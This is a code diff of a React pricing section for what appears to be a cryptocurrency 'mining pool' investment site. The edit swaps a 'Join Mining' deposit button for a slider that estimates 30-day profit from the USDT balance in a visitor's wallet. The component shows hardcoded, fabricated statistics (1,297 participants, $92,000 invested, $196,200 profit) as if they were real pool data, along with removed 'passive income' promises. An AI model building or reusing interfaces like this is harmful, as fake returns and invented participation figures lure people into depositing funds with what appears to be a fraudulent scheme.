@@ -110,37 +110,18 @@ const Price = () => {
 
   return (
     <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
-      
-      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">MINING PLAN</h2>
+      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">PROFIT CALCULATION</h2>
         <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
           <div className="text-center">
             <span className="text-6xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
             ${sliderValue}
             </span>
-              <div className="text-green-400 text-md font-semibold mt-2 p-2 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700">Estimated Profit: ${estimatedProfit.toFixed(2)}</div>
-              <p className="text-gray-300 mt-4">Invest in our mining pool and start earning passive income today!</p>
+              <div className="text-green-400 text-md font-semibold mt-2 p-2 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700">Estimated Profit on 30D: ${estimatedProfit.toFixed(2)}</div>
+              
 
-              <div className="mt-4 space-y-3">
-                {[
-                  ['Duration:', '1 month'],
-                  ['Participants:', '1,297'],
-                  ['Total Investment:', '$92,000.00'],
-                  ['Total Profit:', '$196,200.00']
-                ].map(([label, value], index) => (
-                  <div
-                    key={index}
-                    className="flex justify-between p-3 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700"
-                  >
-                    <span className="text-gray-300">{label}</span>
-                    <span className="text-white font-medium">{value}</span>
-                  </div>
-                ))}
-              </div>
-            <div className="mt-4 space-y-3">
-            </div>
-            <div className="px-6 py-4 bg-gradient-to-br from-blue-800 to-purple-800 rounded-lg mb-6">
+              <div className="px-6 py-4 bg-gradient-to-br from-blue-800 to-purple-800 rounded-lg mb-6">
               <label htmlFor="depositSlider" className="block text-gray-200 mb-2">
-                Select Deposit Amount ($)
+              Slide to see profit based on USDT balance in your wallet
               </label>
               <input
                 id="depositSlider"
@@ -158,13 +139,25 @@ const Price = () => {
               </div>
             </div>
 
-            <button
-              onClick={handleJoinMining}
-              disabled={txProcessing || txConfirming}
-              className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white py-3 px-6 rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all shadow-md disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              {(txProcessing || txConfirming) ? "Processing..." : "Join Mining"}
-            </button>
+              <div className="mt-4 space-y-3">
+                {[
+                  ['Participants:', '1,297'],
+                  ['Total Investment:', '$92,000.00'],
+                  ['Total Profit:', '$196,200.00']
+                ].map(([label, value], index) => (
+                  <div
+                    key={index}
+                    className="flex justify-between p-3 rounded-lg bg-white/5 backdrop-blur-sm border border-gray-700"
+                  >
+                    <span className="text-gray-300">{label}</span>
+                    <span className="text-white font-medium">{value}</span>
+                  </div>
+                ))}
+              </div>
+            <div className="mt-4 space-y-3">
+            </div>
+            
+
           </div>
         </div>
     </section>
